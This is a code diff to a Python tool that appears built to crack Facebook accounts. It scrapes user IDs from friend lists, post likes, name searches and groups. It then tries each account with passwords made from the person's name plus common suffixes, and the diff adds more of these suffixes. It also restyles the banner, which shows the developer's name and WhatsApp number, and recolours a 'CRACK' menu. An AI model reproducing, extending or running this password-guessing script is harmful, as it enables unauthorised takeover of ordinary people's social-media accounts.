@@ -12,40 +12,16 @@ def kata(s):
         time.sleep(1./300)
 def baner():
     time.sleep(0.1)
-    kata("""\033[31;1m.@.                                    .
-            \033[31;1m@m@,.                                 .@
-            \033[31;1m.@m%nm@,.                            .@m@
-            \033[31;1m.@nvv%vnmm@,.                      .@mn%n@
-        \033[31;1m.@mnvvv%vvnnmm@,.                .@mmnv%vn@,
-        \033[31;1m@mmnnvvv%vvvvvnnmm@,.        .@mmnnvvv%vvnm@
-       \033[31;1m@mmnnvvvvv%vvvvvvnnmm@, ;;;@mmnnvvvvv%vvvnm@,
-       \033[31;1m`@mmnnvvvvvv%vvvvvnnmmm;;@mmnnvvvvvv%vvvvnmm@
-         \033[31;1m`@mmmnnvvvvvv%vvvnnmmm;%mmnnvvvvvv%vvvvnnmm@
-            \033[31;1m`@m%v%v%v%v%v;%;%;%;%;%;%;%%%vv%vvvvnnnmm@
-             \033[31;1m.,mm@@@@@mm%;;@@m@m@@m@@m@mm;;%%vvvnnnmm@;@,.
-         \033[31;1m.,@mmmmmmvv%%;;@@vmvvvvvvvvvmvm@@;;%%vvnnm@;%mmm@,
-       \033[31;1m.,@mmnnvvvvv%%;;@@vvvvv%%%%%%%vvvvmm@@;;%%mm@;%%nnnnm@,
-    \033[31;1m.,@mnnvv%v%v%v%%;;@mmvvvv%%;*;*;%%vvvvmmm@;;%m;%%v%v%v%vmm@,.
-\033[31;1m,@mnnvv%v%v%v%v%v%v%;;@@vvvv%%;*;*;*;%%vvvvm@@;;m%%%v%v%v%v%v%vnnm@,
-\033[37;1m`@mnnvv%v%v%v%%;;@mvvvvv%%;;*;;%%vvvmmmm@;;%m;%%v%v%v%vmm@'   '
-       \033[37;1m`@mmnnvvvvv%%;;@@mvvvv%%%%%%%vvvvmm@@;;%%mm@;%%nnnnm@'
-          \033[37;1m`@mmmmmmvv%%;;@@mvvvvvvvvvvmmm@@;;%%mmnmm@;%mmm@'
-            \033[37;1m`mm@@@@@mm%;;@m@@m@m@m@@m@@;;%%vvvvvnmm@;@'
-            \033[37;1m,@m%v%v%v%v%v;%;%;%;%;%;%;%;%vv%vvvvvnnmm@
-           \033[37;1m.@mmnnvvvvvvv%vvvvnnmm%mmnnvvvvvvv%vvvvnnmm@
-         \033[37;1m.@mmnnvvvvvv%vvvvvvnnmm'`@mmnnvvvvvv%vvvnnmm@
-         \033[37;1m@mmnnvvvvv%vvvvvvnnmm@':%::`@mmnnvvvv%vvvnm@'
-         \033[37;1m@mmnnvvv%vvvvvnnmm@'`:::%%:::'`@mmnnvv%vvmm@
-         \033[37;1m`@mnvvv%vvnnmm@'     `:;%%;:'     `@mvv%vm@'
-           \033[37;1m`@mnv%vnnm@'          `;%;'         `@n%n@
-           \033[37;1m`@m%mm@'              ;%;.           `@m@
-            \033[37;1m@m@'                 `;%;             `@
-             \033[37;1m`@'                   ;%;.             '    
-             \033[37;1m`                    `;%; 
+    kata("""\033[31;1m╔╗╔═╗╦═╗╦╔═                  
+            \033[31;1m║║╠═╣╠╦╝╠╩╗                  
+            \033[31;1m═╩╝╩ ╩╩╚═╩ ╩                  
+              \033[37;1m╔═╗╔╗   ╔═╗╦ ╦╔═╗╔═╗╦╔═╦╔═╗╔═╗
+              \033[37;1m╠╣ ╠╩╗  ║  ╠═╣║ ║║ ║╠╩╗║║╣ ╚═╗
+              \033[37;1m╚  ╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╩╚═╝╚═╝
 \033[1;38;5;208m============================================
-\033[1;38;5;208m💥DEVLOPER : FAIZUL BOFTEN
-\033[1;38;5;208m💥FACEBOOK " FAIZUL
-\033[1;38;5;208m💥WA       : 082271426251
+\033[31;1m❌DEVLOPER :\033[37;1mFAIZUL BOFTEN
+\033[31;1m❌FACEBOOK "\033[37;1mFAIZUL
+\033[31;1m❌WA       :\033[37;1m082271426251
 \033[1;38;5;208m============================================""")
 def balik():
     f=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
@@ -146,7 +122,7 @@ def mbf():
                         continue
                  else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00mretrieved",end="")
+                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00mmengambil ID",end="")
              if 'Lihat Teman Lain' in str(raw):
                  getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
              return id
@@ -166,7 +142,7 @@ def mbf():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00mretrieved',end="")
+                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00mmengambil ID',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
              return id
@@ -178,7 +154,7 @@ def mbf():
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                   else:
                          id.append(user[1] + "|" + user[0].split("?")[0])
-                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
+                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mmengambil ID ",end="")
              if "Lihat Hasil Selanjutnya" in str(search):
                   bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
              return id
@@ -190,7 +166,7 @@ def mbf():
                          id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0])
-                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
+                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mmengambil ID ",end="")
              if "Lihat Selengkapnya" in str(grab):
                  grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
              return id
@@ -202,13 +178,13 @@ def mbf():
                    clear()
                    baner()
                    kata('\033[31;1m=====================================================')
-                   kata('\033[1;97m{\33[1;95m01\033[1;97m}\033[32;1mCRACK DAFTAR TEMAN')
-                   kata('\033[1;97m{\033[1;95m02\033[1;97m}\033[32;1mCRACK LIKE/POST')
-                   kata('\033[1;97m{\033[1;95m03\033[1;97m}\033[32;1mCRACK DARI PENCARIAN NAMA')
-                   kata('\033[1;97m{\033[1;95m04\033[1;97m}\033[32;1mCRACK DARI GRUB')
-                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1mCRACK DARI GRUB')
-                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1mCRACK DARI  TEMAN')
-                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1mLIAT  HASIL DUMP')
+                   kata('\033[1;97m{\33[1;95m01\033[1;97m}\033[31;1mCRACK DAFTAR TEMAN')
+                   kata('\033[1;97m{\033[1;95m02\033[1;97m}\033[37;1mCRACK LIKE/POST')
+                   kata('\033[1;97m{\033[1;95m03\033[1;97m}\033[31;1mCRACK DARI PENCARIAN NAMA')
+                   kata('\033[1;97m{\033[1;95m04\033[1;97m}\033[37;1mCRACK DARI GRUB')
+                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[31;1mCRACK DARI GRUB')
+                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[37;1mCRACK DARI  TEMAN')
+                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[31;1mLIAT  HASIL DUMP')
                    kata('\033[31;1m=======================================================')
                    print()
                    tanya = input('\033[90m> \033[1;93m ')
@@ -287,6 +263,18 @@ def mbf():
                                                   str(x) + '12345',
                                                   str(x) + '123456',
                                                   str(x) + '12',
+                                                  str(x) + 'kontol',
+                                                  str(x) + 'kontol23',
+                                                  str(x) + 'Freefire123',
+                                                  str(x) + 'boyah',
+                                                  str(x) + 'katasandi',
+                                                  str(x) + 'katasandilupa',
+                                                  str(x) + 'nation',
+                                                  str(x) + 'editor',
+                                                  str(x) + '08',
+                                                  str(x) + '17',
+                                                  str(x) + '54321',
+                                                  str(x) + '1234567',
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
